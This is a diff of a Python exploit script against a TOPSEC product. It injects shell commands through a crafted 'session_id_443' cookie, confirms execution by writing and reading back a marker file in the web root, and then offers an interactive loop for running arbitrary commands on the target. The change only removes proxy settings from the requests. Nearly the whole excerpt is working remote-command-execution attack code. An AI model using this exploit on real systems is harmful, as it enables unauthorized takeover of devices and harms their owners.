@@ -21,10 +21,10 @@ def run(url):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
             "Cookie": "session_id_443=1|echo 'Klmiuhgs' > /www/htdocs/site/image/{};".format(random_string)
         }
-        command_response = requests.get(target, headers=headers, verify=False, proxies=proxies)
+        command_response = requests.get(target, headers=headers, verify=False)
         if command_response.status_code == 200 and "window" in command_response.text and "self" in command_response.text  and "opener" in command_response.text:
             result_url = urljoin(url, "/site/image/{}".format(random_string))
-            command_response = requests.get(result_url, headers=headers, verify=False, proxies=proxies)
+            command_response = requests.get(result_url, headers=headers, verify=False)
             if command_response.status_code == 200 and "Klmiuhgs" in command_response.text:
                 print("\033[31mDiscovered: TOPSEC-product Cookie Remote Command Execution Vulnerability!:\033[0m")
                 result_url = urljoin(url, "/site/image/{}".format(random_string))
@@ -35,8 +35,8 @@ def run(url):
                             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
                             "Cookie": "session_id_443=1|echo $({})> /www/htdocs/site/image/{};".format(command,random_string)
                         }
-                        requests.get(target, headers=command_headers, verify=False, proxies=proxies)
-                        result_response = requests.get(result_url, headers=command_headers, timeout=15,verify=False, proxies=proxies)
+                        requests.get(target, headers=command_headers, verify=False)
+                        result_response = requests.get(result_url, headers=command_headers, timeout=15,verify=False)
                         print(result_response.text)
                     else:
                         break
